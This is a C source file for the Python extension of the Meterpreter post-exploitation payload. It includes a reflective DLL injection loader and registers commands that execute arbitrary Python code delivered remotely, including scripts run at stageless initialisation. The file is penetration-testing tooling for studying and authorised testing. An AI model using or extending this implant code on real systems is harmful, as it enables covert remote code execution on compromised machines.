/*!
 * @file python_main.c
 * @brief Entry point and intialisation definitions for the python extension.
 */
#include "common.h"
#include "common_metapi.h"

// Required so that use of the API works.
MetApi* met_api = NULL;

#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#include "python_commands.h"
#include "python_meterpreter_binding.h"

// This is the entry point to the python DLL, we proxy to this from our own init
extern BOOL WINAPI PythonDllMain(HANDLE hInst, ULONG ul_reason_for_call, LPVOID lpReserved);
extern BOOL WINAPI CtypesDllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvRes);

Remote* gRemote = NULL;

/*! @brief List of commands that the extended API extension providers. */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_PYTHON_RESET, request_python_reset),
	COMMAND_REQ(COMMAND_ID_PYTHON_EXECUTE, request_python_execute),
	COMMAND_TERMINATOR
};

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
		{
			*(HMODULE*)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}

	PythonDllMain(hinstDLL, dwReason, lpReserved);
	CtypesDllMain(hinstDLL, dwReason, lpReserved);
	return TRUE;
}

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;

	met_api->command.register_all(customCommands);
	gRemote = remote;

	dprintf("[PYTHON] Initialising");
	binding_startup();

	python_prepare_session();
	dprintf("[PYTHON] Registering commands");
	met_api->command.register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all(customCommands);

	python_destroy_session();

	return ERROR_SUCCESS;
}

/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	if (extensionId == EXTENSION_ID_PYTHON)
	{
		dprintf("[PSH] Executing stagless script:\n%s", (LPCSTR)buffer);
		python_execute(NULL, (LPSTR)buffer, bufferSize, PY_CODE_TYPE_PY, NULL, NULL);
	}
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
	binding_add_command(commandId);
}